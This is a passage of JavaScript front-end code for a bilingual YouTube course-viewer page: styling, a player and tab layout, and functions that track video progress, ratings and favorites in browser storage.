    '.yt-stats-box small { opacity: 0.6; font-size: 0.85rem; }' +

    // Rating stars with glow effect
    '.yt-rating { display: flex; align-items: center; gap: 6px; margin-top: 15px; }' +
    '.rating-star { font-size: 1.3rem; cursor: pointer; color: rgba(255,255,255,0.2); transition: all 0.2s ease; }' +
    '.rating-star:hover { color: #ffc107; transform: scale(1.2); filter: drop-shadow(0 0 8px rgba(255,193,7,0.5)); }' +
    '.rating-star.active { color: #ffc107; filter: drop-shadow(0 0 5px rgba(255,193,7,0.4)); }' +

    // Main layout
    '.yt-viewer-main { display: grid; grid-template-columns: 1fr 400px; min-height: calc(100vh - 200px); position: relative; }' +
    '@media (max-width: 1200px) { .yt-viewer-main { grid-template-columns: 1fr; } .yt-playlist-sidebar { max-height: 450px; border-left: none; border-top: 1px solid rgba(255,255,255,0.08); } .yt-course-info { grid-template-columns: 1fr; } .yt-thumbnail { width: 100%; height: 200px; } }' +

    // Player section with premium styling
    '.yt-player-section { padding: 25px 30px; }' +
    '.yt-player-wrapper { position: relative; width: 100%; padding-bottom: 56.25%; background: linear-gradient(135deg, #0a0a1a, #1a1a2e); border-radius: 20px; overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.05); }' +
    '.yt-player-wrapper::before { content: ""; position: absolute; inset: -2px; background: linear-gradient(135deg, rgba(102,126,234,0.3), transparent, rgba(118,75,162,0.3)); border-radius: 22px; z-index: -1; opacity: 0; transition: opacity 0.3s; }' +
    '.yt-player-wrapper:hover::before { opacity: 1; }' +
    '.yt-player-wrapper iframe { position: absolute; inset: 0; width: 100%; height: 100%; border: none; border-radius: 20px; }' +

    // Video info card
    '.yt-video-info { margin-top: 25px; padding: 25px; background: rgba(255,255,255,0.03); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.06); }' +
    '.yt-video-info h3 { font-size: 1.25rem; margin-bottom: 12px; font-weight: 600; }' +
    '.yt-video-meta { display: flex; gap: 20px; flex-wrap: wrap; font-size: 0.9rem; opacity: 0.6; margin-bottom: 20px; }' +
    '.yt-video-meta span { display: flex; align-items: center; gap: 6px; }' +

    // Premium buttons
    '.yt-controls { display: flex; gap: 12px; flex-wrap: wrap; }' +
    '.yt-btn { padding: 12px 22px; border: none; border-radius: 12px; cursor: pointer; font-weight: 600; transition: all 0.3s ease; display: inline-flex; align-items: center; gap: 10px; font-size: 0.9rem; position: relative; overflow: hidden; }' +
    '.yt-btn::before { content: ""; position: absolute; inset: 0; background: linear-gradient(rgba(255,255,255,0.1), transparent); opacity: 0; transition: opacity 0.3s; }' +
    '.yt-btn:hover::before { opacity: 1; }' +
    '.yt-btn-nav { background: rgba(255,255,255,0.08); color: white; border: 1px solid rgba(255,255,255,0.1); }' +
    '.yt-btn-nav:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }' +
    '.yt-btn-nav:disabled { opacity: 0.3; cursor: not-allowed; transform: none; }' +
    '.yt-btn-success { background: linear-gradient(135deg, #28a745, #20c997); color: white; box-shadow: 0 4px 15px rgba(40,167,69,0.3); }' +
    '.yt-btn-success:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(40,167,69,0.4); }' +
    '.yt-btn-success.marked { background: linear-gradient(135deg, #6c757d, #5a6268); box-shadow: none; }' +
    '.yt-btn-danger { background: linear-gradient(135deg, #ff0000, #cc0000); color: white; box-shadow: 0 4px 15px rgba(255,0,0,0.3); }' +
    '.yt-btn-danger:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,0,0.4); }' +
    '.yt-btn-primary { background: linear-gradient(135deg, #667eea, #764ba2); color: white; box-shadow: 0 4px 15px rgba(102,126,234,0.3); }' +
    '.yt-btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }' +

    // Notes section
    '.yt-notes-section { margin-top: 25px; padding: 25px; background: rgba(255,255,255,0.03); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.06); }' +
    '.yt-notes-section h4 { margin-bottom: 15px; display: flex; align-items: center; gap: 10px; font-weight: 600; }' +
    '.yt-notes-textarea { width: 100%; min-height: 120px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: white; padding: 15px; resize: vertical; font-family: inherit; font-size: 0.95rem; line-height: 1.6; transition: all 0.3s; }' +
    '.yt-notes-textarea:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.2); }' +
    '.yt-notes-textarea::placeholder { color: rgba(255,255,255,0.3); }' +

    // Sidebar with glassmorphism
    '.yt-playlist-sidebar { background: rgba(10,10,26,0.95); backdrop-filter: blur(20px); border-left: 1px solid rgba(255,255,255,0.06); display: flex; flex-direction: column; position: sticky; top: 0; height: 100vh; z-index: 100; overflow: hidden; }' +
    '.yt-sidebar-header { padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.06); background: rgba(255,255,255,0.02); }' +
    '.yt-sidebar-header h4 { font-size: 1rem; margin-bottom: 12px; font-weight: 600; display: flex; align-items: center; gap: 10px; }' +
    '.yt-progress-info { display: flex; justify-content: space-between; font-size: 0.85rem; opacity: 0.7; margin-bottom: 10px; }' +
    '.yt-progress-bar { height: 8px; background: rgba(255,255,255,0.08); border-radius: 10px; overflow: hidden; }' +
    '.yt-progress-fill { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2, #f093fb); background-size: 200% 100%; animation: shimmer 2s linear infinite; transition: width 0.5s ease; border-radius: 10px; }' +
    '@keyframes shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }' +
    '.yt-continue-btn { margin-top: 15px; width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea, #764ba2); border: none; color: white; border-radius: 12px; cursor: pointer; font-weight: 600; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; }' +
    '.yt-continue-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }' +

    // Video list with better hover effects
    '.yt-videos-list { flex: 1; overflow-y: auto; padding: 12px; }' +
    '.yt-videos-list::-webkit-scrollbar { width: 6px; }' +
    '.yt-videos-list::-webkit-scrollbar-track { background: rgba(255,255,255,0.02); }' +
    '.yt-videos-list::-webkit-scrollbar-thumb { background: rgba(102,126,234,0.3); border-radius: 10px; }' +
    '.yt-videos-list::-webkit-scrollbar-thumb:hover { background: rgba(102,126,234,0.5); }' +
    '.video-item { display: flex; align-items: center; gap: 14px; padding: 14px; border-radius: 12px; cursor: pointer; transition: all 0.25s ease; margin-bottom: 6px; border: 1px solid transparent; }' +
    '.video-item:hover { background: rgba(255,255,255,0.06); transform: translateX(5px); }' +
    '.video-item.active { background: linear-gradient(135deg, rgba(102,126,234,0.2), rgba(118,75,162,0.1)); border-color: rgba(102,126,234,0.3); box-shadow: 0 4px 15px rgba(102,126,234,0.15); }' +
    '.video-item.watched .video-num { background: linear-gradient(135deg, #28a745, #20c997); box-shadow: 0 2px 10px rgba(40,167,69,0.3); }' +
    '.video-num { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.08); border-radius: 10px; font-size: 0.8rem; font-weight: 700; flex-shrink: 0; transition: all 0.3s; }' +
    '.video-info { flex: 1; min-width: 0; }' +
    '.video-title { font-size: 0.88rem; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; font-weight: 500; }' +
    '.video-duration { font-size: 0.75rem; opacity: 0.5; margin-top: 5px; display: flex; align-items: center; gap: 5px; }' +
    '.playing-icon { color: #667eea; font-size: 1.2rem; animation: pulse 1.5s ease-in-out infinite; }' +
    '@keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(0.95); } }' +

    // Certificate with premium design
    '.yt-certificate { margin-top: 25px; padding: 30px; background: linear-gradient(135deg, #ffd700 0%, #ff8c00 50%, #ffd700 100%); background-size: 200% 100%; animation: goldShimmer 3s linear infinite; border-radius: 16px; text-align: center; color: #000; box-shadow: 0 10px 40px rgba(255,215,0,0.3); }' +
    '@keyframes goldShimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }' +
    '.yt-certificate h4 { margin-bottom: 12px; font-size: 1.2rem; }' +
    '.yt-certificate-icon { font-size: 3.5rem; margin-bottom: 15px; }' +

    // Tabs Navigation
    '.yt-tabs { display: flex; border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; gap: 5px; }' +
    '.yt-tab { background: transparent; border: none; color: rgba(255,255,255,0.6); padding: 15px 25px; cursor: pointer; font-size: 0.95rem; font-weight: 500; transition: all 0.3s; border-bottom: 3px solid transparent; display: flex; align-items: center; gap: 8px; }' +
    '.yt-tab:hover { color: white; background: rgba(255,255,255,0.05); }' +
    '.yt-tab.active { color: white; border-bottom-color: #667eea; background: rgba(102,126,234,0.1); }' +
    '.yt-tab-content { display: none; animation: fadeIn 0.3s ease; }' +
    '.yt-tab-content.active { display: block; }' +
    '@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }' +

    // Loading Skeleton
    '.yt-skeleton { background: linear-gradient(90deg, rgba(255,255,255,0.05) 25%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0.05) 75%); background-size: 200% 100%; animation: skeleton-shimmer 1.5s infinite; border-radius: 8px; }' +
    '@keyframes skeleton-shimmer { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }' +
    '.yt-skeleton-player { width: 100%; padding-bottom: 56.25%; border-radius: 16px; }' +
    '.yt-skeleton-title { height: 24px; width: 60%; margin-bottom: 10px; }' +
    '.yt-skeleton-text { height: 16px; width: 40%; margin-bottom: 8px; }' +
    '.yt-skeleton-btn { height: 44px; width: 120px; border-radius: 12px; }' +

    // Related Courses
    '.yt-related-section { margin-top: 30px; padding: 25px; background: rgba(255,255,255,0.03); border-radius: 16px; border: 1px solid rgba(255,255,255,0.06); }' +
    '.yt-related-section h4 { margin-bottom: 20px; display: flex; align-items: center; gap: 10px; font-weight: 600; }' +
    '.yt-related-courses { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }' +
    '.yt-related-card { background: rgba(0,0,0,0.3); border-radius: 12px; overflow: hidden; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.05); }' +
    '.yt-related-card:hover { transform: translateY(-5px); border-color: rgba(102,126,234,0.3); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }' +
    '.yt-related-thumb { height: 140px; background-size: cover; background-position: center; position: relative; }' +
    '.yt-related-thumb::after { content: ""; position: absolute; inset: 0; background: linear-gradient(transparent 50%, rgba(0,0,0,0.8) 100%); }' +
    '.yt-related-info { padding: 15px; }' +
    '.yt-related-info h5 { font-size: 0.95rem; margin-bottom: 8px; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }' +
    '.yt-related-info small { opacity: 0.6; font-size: 0.8rem; }' +

    // Badges Display
    '.yt-badges-section { margin-top: 20px; }' +
    '.yt-badges-grid { display: flex; flex-wrap: wrap; gap: 10px; }' +
    '.yt-badge-item { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 12px 16px; display: flex; align-items: center; gap: 10px; transition: all 0.3s; }' +
    '.yt-badge-item:hover { background: rgba(102,126,234,0.15); border-color: rgba(102,126,234,0.3); transform: scale(1.02); }' +
    '.yt-badge-icon { font-size: 1.5rem; }' +
    '.yt-badge-name { font-size: 0.85rem; font-weight: 600; }' +
    '.yt-badge-desc { font-size: 0.75rem; opacity: 0.6; }' +

    // Quiz Styles
    '.yt-quiz-card { background: rgba(255,255,255,0.05); border-radius: 12px; padding: 20px; border: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; animation: fadeIn 0.5s ease; }' +
    '.yt-quiz-question { font-size: 1.1rem; font-weight: 600; margin-bottom: 20px; color: white; }' +
    '.yt-quiz-options { display: flex; flex-direction: column; gap: 10px; }' +
    '.yt-quiz-option { padding: 15px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; cursor: pointer; transition: all 0.2s; text-align: inherit; position: relative; }' +
    '.yt-quiz-option:hover { background: rgba(255,255,255,0.08); transform: translateY(-2px); }' +
    '.yt-quiz-option.selected { border-color: #667eea; background: rgba(102,126,234,0.1); }' +
    '.yt-quiz-option.correct { background: rgba(40,167,69,0.2) !important; border-color: #28a745 !important; }' +
    '.yt-quiz-option.wrong { background: rgba(220,53,69,0.2) !important; border-color: #dc3545 !important; }' +
    '.yt-quiz-feedback { margin-top: 15px; padding: 15px; border-radius: 8px; display: none; animation: slideDown 0.3s ease; }' +
    '.yt-quiz-feedback.success { background: rgba(40,167,69,0.1); border: 1px solid rgba(40,167,69,0.3); color: #2ecc71; }' +
    '.yt-quiz-feedback.error { background: rgba(220,53,69,0.1); border: 1px solid rgba(220,53,69,0.3); color: #ff6b6b; }' +
    '@keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }' +
    '</style>' +

    // Header with course info
    '<div class="yt-header">' +
    '<div class="yt-header-top">' +
    '<button class="yt-back-btn" onclick="loadPage(\'courses\')"><i class="fa-solid fa-arrow-' + (currentLang === 'ar' ? 'right' : 'left') + ' me-2"></i>' + txt('العودة للكورسات', 'Back to Courses') + '</button>' +
    '<div class="yt-header-actions">' +
    '<button class="yt-action-btn favorite ' + (isFavorite ? 'active' : '') + '" onclick="toggleYouTubeFavorite(\'' + playlistId + '\')" title="' + txt('إضافة للمفضلة', 'Add to Favorites') + '">' +
    '<i class="fa-solid fa-heart"></i>' +
    '</button>' +
    '<button class="yt-action-btn" onclick="toggleTheaterMode()" title="' + txt('وضع المسرح', 'Theater Mode') + '">' +
    '<i class="fa-solid fa-expand"></i>' +
    '</button>' +
    '<a href="https://www.youtube.com/playlist?list=' + playlist.playlistId + '" target="_blank" class="yt-action-btn" style="background: #ff0000;" title="YouTube">' +
    '<i class="fa-brands fa-youtube"></i>' +
    '</a>' +
    '</div>' +
    '</div>' +

    '<div class="yt-course-info">' +
    '<div class="yt-thumbnail" style="background-image: url(\'https://img.youtube.com/vi/' + playlist.thumbnail + '/hqdefault.jpg\')"></div>' +
    '<div class="yt-course-details">' +
    '<h1>' + (currentLang === 'ar' ? playlist.titleAr : playlist.title) + '</h1>' +
    '<p>' + (currentLang === 'ar' ? playlist.description : playlist.descriptionEn) + '</p>' +
    '<div class="yt-meta-badges">' +
    '<span class="yt-badge" style="background: ' + levelColor + '; color: white;">' + levelText + '</span>' +
    '<span class="yt-badge" style="background: ' + catColor + '; color: white;"><i class="fa-solid fa-tag me-1"></i>' + catName + '</span>' +
    '<span class="yt-badge" style="background: rgba(255,255,255,0.1);"><i class="fa-solid fa-video me-1"></i>' + playlist.totalVideos + ' ' + txt('فيديو', 'videos') + '</span>' +
    '<span class="yt-badge" style="background: rgba(255,255,255,0.1);"><i class="fa-solid fa-clock me-1"></i>~' + Math.round(estimatedDuration / 60) + ' ' + txt('ساعات', 'hours') + '</span>' +
    '<span class="yt-badge" style="background: rgba(255,255,255,0.1);"><i class="fa-solid fa-user me-1"></i>' + playlist.channel + '</span>' +
    '</div>' +
    '<div class="yt-rating" title="' + txt('قيّم هذا الكورس', 'Rate this course') + '">' +
    starsHtml +
    '<span style="margin-left: 10px; opacity: 0.7;">' + (currentRating > 0 ? currentRating + '/5' : txt('قيّم الكورس', 'Rate')) + '</span>' +
    '</div>' +
    '</div>' +
    '<div class="yt-stats-box">' +
    '<h3>' + progressPercent + '%</h3>' +
    '<small>' + txt('مكتمل', 'Complete') + '</small>' +
    '<div style="margin-top: 10px; font-size: 0.8rem; opacity: 0.7;"><i class="fa-solid fa-clock me-1"></i>' + watchTimeMinutes + ' ' + txt('دقيقة مشاهدة', 'min watched') + '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +

    // Main content
    '<div class="yt-viewer-main">' +
    // Player section
    '<div class="yt-player-section">' +
    '<div class="yt-player-wrapper" id="yt-player-container">' +
    '<iframe id="yt-iframe" src="https://www.youtube.com/embed/' + currentVideo.videoId + '?rel=0&modestbranding=1&showinfo=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>' +
    '</div>' +

    '<div class="yt-video-info">' +
    '<h3 id="current-video-title">' + currentVideo.title + '</h3>' +
    '<div class="yt-video-meta">' +
    '<span><i class="fa-solid fa-play me-1"></i>' + txt('الفيديو', 'Video') + ' ' + (currentVideoIndex + 1) + ' ' + txt('من', 'of') + ' ' + playlist.totalVideos + '</span>' +
    '<span><i class="fa-solid fa-clock me-1"></i>~10 ' + txt('دقائق', 'minutes') + '</span>' +
    '</div>' +

    '<div class="yt-controls">' +
    '<button class="yt-btn yt-btn-nav" onclick="navigateYouTubeVideo(\'' + playlistId + '\', -1)" ' + (currentVideoIndex === 0 ? 'disabled' : '') + '>' +
    '<i class="fa-solid fa-chevron-' + (currentLang === 'ar' ? 'right' : 'left') + '"></i>' + txt('السابق', 'Previous') +
    '</button>' +
    '<button class="yt-btn yt-btn-success" id="mark-watched-btn" onclick="markVideoWatched(\'' + playlistId + '\', \'' + currentVideo.videoId + '\')">' +
    '<i class="fa-solid fa-check"></i>' + txt('تم المشاهدة', 'Mark Complete') +
    '</button>' +
    '<button class="yt-btn yt-btn-nav" onclick="navigateYouTubeVideo(\'' + playlistId + '\', 1)" ' + (currentVideoIndex >= playlist.totalVideos - 1 ? 'disabled' : '') + '>' +
    txt('التالي', 'Next') + '<i class="fa-solid fa-chevron-' + (currentLang === 'ar' ? 'left' : 'right') + '"></i>' +
    '</button>' +
    '<a href="https://www.youtube.com/watch?v=' + currentVideo.videoId + '" target="_blank" class="yt-btn yt-btn-danger">' +
    '<i class="fa-brands fa-youtube"></i>' + txt('شاهد على يوتيوب', 'Watch on YouTube') +
    '</a>' +
    '</div>' +
    '</div>' +

    // Tabs Navigation
    '<div class="yt-tabs">' +
    '<button class="yt-tab active" onclick="switchYouTubeTab(\'description\')"><i class="fa-solid fa-info-circle"></i>' + txt('الوصف', 'Description') + '</button>' +
    '<button class="yt-tab" onclick="switchYouTubeTab(\'notes\')"><i class="fa-solid fa-sticky-note"></i>' + txt('ملاحظاتي', 'My Notes') + '</button>' +
    '<button class="yt-tab" onclick="switchYouTubeTab(\'badges\')"><i class="fa-solid fa-trophy"></i>' + txt('الإنجازات', 'Badges') + '</button>' +
    '<button class="yt-tab" onclick="switchYouTubeTab(\'related\')"><i class="fa-solid fa-link"></i>' + txt('كورسات مشابهة', 'Related') + '</button>' +
    // Quiz Tab (only if quizzes exist)
    (playlist.quizzes && playlist.quizzes.length > 0 ?
      '<button class="yt-tab" onclick="switchYouTubeTab(\'quiz\')"><i class="fa-solid fa-clipboard-question"></i>' + txt('اختبار', 'Quiz') + '</button>' : '') +
    '</div>' +

    // Tab: Description
    '<div class="yt-tab-content active" id="tab-description">' +
    '<div class="yt-notes-section">' +
    '<h4><i class="fa-solid fa-book me-2"></i>' + txt('عن هذا الكورس', 'About this Course') + '</h4>' +
    '<p style="opacity: 0.8; line-height: 1.8;">' + (currentLang === 'ar' ? playlist.description : playlist.descriptionEn) + '</p>' +
    '<div style="margin-top: 20px; display: flex; gap: 20px; flex-wrap: wrap;">' +
    '<div><i class="fa-solid fa-user-tie me-2" style="color: #667eea;"></i><strong>' + txt('المحاضر', 'Instructor') + ':</strong> ' + playlist.channel + '</div>' +
    '<div><i class="fa-solid fa-layer-group me-2" style="color: #667eea;"></i><strong>' + txt('الفئة', 'Category') + ':</strong> ' + playlist.category + '</div>' +
    '<div><i class="fa-solid fa-signal me-2" style="color: #667eea;"></i><strong>' + txt('المستوى', 'Level') + ':</strong> ' + playlist.level + '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +

    // Tab: Notes
    '<div class="yt-tab-content" id="tab-notes">' +
    '<div class="yt-notes-section">' +
    '<h4><i class="fa-solid fa-sticky-note me-2"></i>' + txt('ملاحظاتي', 'My Notes') + '</h4>' +
    '<textarea class="yt-notes-textarea" id="course-notes" placeholder="' + txt('اكتب ملاحظاتك هنا...', 'Write your notes here...') + '" onchange="saveYouTubeNotes(\'' + playlistId + '\')">' + userNotes + '</textarea>' +
    '<button class="yt-btn yt-btn-primary" style="margin-top: 15px;" onclick="saveYouTubeNotes(\'' + playlistId + '\'); showYouTubeToast(\'' + txt('تم حفظ الملاحظات', 'Notes saved') + '\')"><i class="fa-solid fa-save me-2"></i>' + txt('حفظ الملاحظات', 'Save Notes') + '</button>' +
    '</div>' +
    '</div>' +

    // Tab: Badges
    '<div class="yt-tab-content" id="tab-badges">' +
    '<div class="yt-notes-section">' +
    '<h4><i class="fa-solid fa-trophy me-2"></i>' + txt('إنجازاتي', 'My Achievements') + '</h4>' +
    '<div class="yt-badges-grid" id="badges-container"></div>' +
    '</div>' +
    '</div>' +

    // Tab: Related Courses
    '<div class="yt-tab-content" id="tab-related">' +
    '<div class="yt-related-section">' +
    '<h4><i class="fa-solid fa-link me-2"></i>' + txt('كورسات مشابهة', 'Related Courses') + '</h4>' +
    '<div class="yt-related-courses" id="related-courses-container"></div>' +
    '</div>' +
    '</div>' +

    // Tab: Quiz
    '<div class="yt-tab-content" id="tab-quiz">' +
    '<div class="yt-notes-section">' +
    '<h4><i class="fa-solid fa-clipboard-question me-2"></i>' + txt('اختبار قصير', 'Mini Quiz') + '</h4>' +
    '<div id="yt-quiz-container"></div>' +
    '</div>' +
    '</div>' +

    // Certificate (if complete)
    (hasCertificate ?
      '<div class="yt-certificate">' +
      '<div class="yt-certificate-icon">🏅</div>' +
      '<h4>' + txt('تهانينا! لقد أكملت هذا الكورس', 'Congratulations! You completed this course') + '</h4>' +
      '<button class="yt-btn" style="background: #000; color: #ffd700; margin-top: 10px;" onclick="generateCertificate(\'' + playlistId + '\')">' +
      '<i class="fa-solid fa-download me-2"></i>' + txt('تحميل الشهادة', 'Download Certificate') +
      '</button>' +
      '</div>' : '') +
    '</div>' +

    // Sidebar
    '<div class="yt-playlist-sidebar">' +
    '<div class="yt-sidebar-header">' +
    '<h4><i class="fa-solid fa-list me-2"></i>' + txt('قائمة الدروس', 'Lessons List') + '</h4>' +
    '<div class="yt-progress-info">' +
    '<span>' + watchedCount + '/' + playlist.totalVideos + ' ' + txt('مكتمل', 'completed') + '</span>' +
    '<span>' + progressPercent + '%</span>' +
    '</div>' +
    '<div class="yt-progress-bar"><div class="yt-progress-fill" style="width: ' + progressPercent + '%"></div></div>' +
    (currentVideoIndex > 0 ? '<button class="yt-continue-btn" onclick="playYouTubeVideo(\'' + playlistId + '\', ' + currentVideoIndex + ')"><i class="fa-solid fa-play me-2"></i>' + txt('متابعة من حيث توقفت', 'Continue where you left') + '</button>' : '') +
    '</div>' +
    '<div class="yt-videos-list">' + videosListHtml + '</div>' +
    '</div>' +
    '</div>' +

    '</div>' +

    '<script>initYouTubeKeyboard("' + playlistId + '");</script>' +
    '</div>';
}

// YouTube Viewer Helper Functions
window.playYouTubeVideo = function (playlistId, videoIndex) {
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var playlist = ytData.playlists.find(function (p) { return p.id === playlistId; });
  if (!playlist || videoIndex < 0 || videoIndex >= playlist.videos.length) return;

  var video = playlist.videos[videoIndex];

  // Update iframe
  var iframe = document.getElementById('yt-iframe');
  if (iframe) {
    iframe.src = 'https://www.youtube.com/embed/' + video.videoId + '?autoplay=1&rel=0&modestbranding=1&showinfo=0';
  }

  // Update video title
  var titleEl = document.getElementById('current-video-title');
  if (titleEl) {
    titleEl.textContent = video.title;
  }

  // Update active state in list
  document.querySelectorAll('.video-item').forEach(function (item, idx) {
    item.classList.toggle('active', idx === videoIndex);
  });

  // Save current position
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  if (!ytProgress[playlistId]) {
    ytProgress[playlistId] = { currentVideo: 0, watchedVideos: [] };
  }
  ytProgress[playlistId].currentVideo = videoIndex;
  localStorage.setItem('youtube_progress', JSON.stringify(ytProgress));

  // Scroll to active video in list
  var activeItem = document.querySelector('.video-item[data-index="' + videoIndex + '"]');
  if (activeItem) {
    activeItem.scrollIntoView({ behavior: 'smooth', block: 'center' });
  }
};

window.navigateYouTubeVideo = function (playlistId, direction) {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  var playlistProgress = ytProgress[playlistId] || { currentVideo: 0, watchedVideos: [] };
  var currentIndex = playlistProgress.currentVideo || 0;
  var newIndex = currentIndex + direction;

  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var playlist = ytData.playlists.find(function (p) { return p.id === playlistId; });

  if (playlist && newIndex >= 0 && newIndex < playlist.videos.length) {
    loadPage('youtube-viewer', playlistId);
    setTimeout(function () {
      playYouTubeVideo(playlistId, newIndex);
    }, 100);
  }
};

window.markVideoWatched = function (playlistId, videoId) {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  if (!ytProgress[playlistId]) {
    ytProgress[playlistId] = { currentVideo: 0, watchedVideos: [] };
  }

  var watchedVideos = ytProgress[playlistId].watchedVideos || [];
  var videoIndex = watchedVideos.indexOf(videoId);
  var isMarking = videoIndex === -1;

  if (isMarking) {
    watchedVideos.push(videoId);
  } else {
    watchedVideos.splice(videoIndex, 1);
  }

  ytProgress[playlistId].watchedVideos = watchedVideos;
  localStorage.setItem('youtube_progress', JSON.stringify(ytProgress));

  // Update UI with animation
  var currentVideoItem = document.querySelector('.video-item.active');
  if (currentVideoItem) {
    currentVideoItem.classList.toggle('watched', isMarking);
    currentVideoItem.style.transform = 'scale(1.02)';
    setTimeout(function () { currentVideoItem.style.transform = ''; }, 200);
    var numEl = currentVideoItem.querySelector('.video-num');
    if (numEl) {
      var idx = parseInt(currentVideoItem.dataset.index);
      numEl.innerHTML = isMarking ? '<i class="fa-solid fa-check"></i>' : (idx + 1);
    }
  }

  // Update progress bar with animation
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var playlist = ytData.playlists.find(function (p) { return p.id === playlistId; });
  if (playlist) {
    var watchedCount = watchedVideos.length;
    var progressPercent = Math.round((watchedCount / playlist.totalVideos) * 100);

    var progressFill = document.querySelector('.yt-progress-fill');
    if (progressFill) {
      progressFill.style.width = progressPercent + '%';
    }

    var progressInfo = document.querySelector('.yt-progress-info span:first-child');
    if (progressInfo) {
      progressInfo.textContent = watchedCount + '/' + playlist.totalVideos + ' ' + txt('مكتمل', 'completed');
    }

    var progressPercEl = document.querySelector('.yt-progress-info span:last-child');
    if (progressPercEl) {
      progressPercEl.textContent = progressPercent + '%';
    }

    // Update stats box
    var statsBox = document.querySelector('.yt-stats-box h3');
    if (statsBox) {
      statsBox.textContent = progressPercent + '%';
      statsBox.style.transform = 'scale(1.1)';
      setTimeout(function () { statsBox.style.transform = ''; }, 300);
    }

    // Show toast notification
    showYouTubeToast(isMarking ? txt('تم وضع علامة كمكتمل ✅', 'Marked as complete ✅') : txt('تم إزالة علامة الإكمال', 'Unmarked'));

    // Check for badge/achievement
    if (progressPercent === 100 && isMarking) {
      showYouTubeToast('🏆 ' + txt('تهانينا! أكملت الكورس بالكامل!', 'Congratulations! You completed the course!'), 'success');
    } else if (progressPercent >= 50 && isMarking && watchedCount === Math.ceil(playlist.totalVideos / 2)) {
      showYouTubeToast('🎯 ' + txt('نصف الطريق! استمر!', 'Halfway there! Keep going!'), 'info');
    }
  }

  // Add XP for watching video
  if (typeof xpSystem !== 'undefined' && isMarking) {
    xpSystem.addXp(5);
  }
};

window.openYouTubePlaylist = function (playlistId) {
  loadPage('youtube-viewer', playlistId);
};

window.filterYouTubeCourses = function (category) {
  // Update active button
  document.querySelectorAll('.category-btn').forEach(function (btn) {
    btn.classList.toggle('active', btn.dataset.cat === category);
  });

  // Filter cards
  document.querySelectorAll('.playlist-card-wrapper').forEach(function (card) {
    if (category === 'all' || card.dataset.category === category) {
      card.style.display = 'block';
    } else {
      card.style.display = 'none';
    }
  });
};

// ========== New YouTube Features ==========

// Rating System
window.rateYouTubeCourse = function (playlistId, rating) {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  if (!ytProgress[playlistId]) {
    ytProgress[playlistId] = { currentVideo: 0, watchedVideos: [], rating: 0, isFavorite: false, notes: '', watchTime: 0 };
  }
  ytProgress[playlistId].rating = rating;
  localStorage.setItem('youtube_progress', JSON.stringify(ytProgress));

  // Update UI
  document.querySelectorAll('.rating-star').forEach(function (star, idx) {
    star.classList.toggle('active', idx < rating);
  });

  // Show feedback
  if (typeof xpSystem !== 'undefined') {
    xpSystem.addXp(10);
  }
};

// Favorites Toggle
window.toggleYouTubeFavorite = function (playlistId) {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  if (!ytProgress[playlistId]) {
    ytProgress[playlistId] = { currentVideo: 0, watchedVideos: [], rating: 0, isFavorite: false, notes: '', watchTime: 0 };
  }
  ytProgress[playlistId].isFavorite = !ytProgress[playlistId].isFavorite;
  localStorage.setItem('youtube_progress', JSON.stringify(ytProgress));

  // Update UI
  var btn = document.querySelector('.yt-action-btn.favorite');
  if (btn) {
    btn.classList.toggle('active', ytProgress[playlistId].isFavorite);
  }
};

// Theater Mode Toggle
window.toggleTheaterMode = function () {
  var container = document.getElementById('yt-viewer');
  if (container) {
    container.classList.toggle('theater-mode');
  }
};

// Save Notes
